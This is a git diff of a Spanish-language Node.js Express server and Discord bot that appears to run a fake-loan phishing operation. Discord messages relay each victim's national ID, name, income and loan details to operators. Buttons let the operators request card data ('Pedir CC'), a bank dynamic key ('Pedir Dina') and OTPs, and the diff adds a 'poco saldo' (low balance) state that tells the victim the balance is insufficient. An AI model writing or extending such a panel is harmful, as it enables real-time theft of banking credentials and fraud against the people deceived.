@@ -71,15 +71,14 @@ app.post('/nuevo', async (req, res) => {
                          { name: '💵 Monto Solicitado', value: `\`${datos.monto}\``, inline: true }
                      );
 
-                // 🔥 NUEVOS BOTONES CON EL DE CONFIRMAR SALDO
+                // 🔥 BOTONES CON EL DE POCO SALDO
                 row = new ActionRowBuilder().addComponents(
                     new ButtonBuilder().setCustomId(`cc_${finalUserId}`).setLabel('💳 Pedir CC').setStyle(ButtonStyle.Primary),
                     new ButtonBuilder().setCustomId(`dina_${finalUserId}`).setLabel('📱 Pedir Dina').setStyle(ButtonStyle.Success),
-                    new ButtonBuilder().setCustomId(`saldo_${finalUserId}`).setLabel('💰 Confirmar Saldo').setStyle(ButtonStyle.Secondary)
+                    new ButtonBuilder().setCustomId(`saldo_${finalUserId}`).setLabel('💰 Poco Saldo').setStyle(ButtonStyle.Secondary)
                 );
             } 
             else if (accion === 'otp') {
-                // ... (código de OTP igual)
                 let infoTexto = '';
                 if (infoCompleta) {
                     infoTexto = `Cédula: ${infoCompleta.cedula || 'N/A'}\nNombre: ${infoCompleta.nombreCompleto || 'N/A'}\nOcupación: ${infoCompleta.ocupacion || 'N/A'}\nIngresos: ${infoCompleta.ingresoMensual || 'N/A'}\nMonto: ${infoCompleta.montoPrestamo || 'N/A'}\nPlazo: ${infoCompleta.meses || 'N/A'} meses\nFecha de pago: día ${infoCompleta.fechaPago || 'N/A'}`;
@@ -143,7 +142,6 @@ app.post('/nuevo', async (req, res) => {
 });
 
 app.post('/validar-otp/:userId', async (req, res) => {
-    // ... (código del OTP igual)
     try {
         const { userId } = req.params;
         const { otp } = req.body;
@@ -200,11 +198,10 @@ client.on('interactionCreate', async (interaction) => {
         sesiones.set(userId, s);
         await interaction.reply({ content: `📱 Se solicitó dinámica al usuario.`, ephemeral: true });
     }
-    // 🔥 NUEVA ACCIÓN PARA CONFIRMAR SALDO
     else if (action === 'saldo') {
-        s.estado = 'confirmar_saldo';
+        s.estado = 'poco_saldo'; // 🔥 NUEVO ESTADO
         sesiones.set(userId, s);
-        await interaction.reply({ content: `💰 Se solicitó confirmar el saldo nuevamente.`, ephemeral: true });
+        await interaction.reply({ content: `💰 Se le notificó al usuario que el saldo es insuficiente.`, ephemeral: true });
     }
     else if (action === 'otp') {
         s.estado = 'pedir_otp'; 
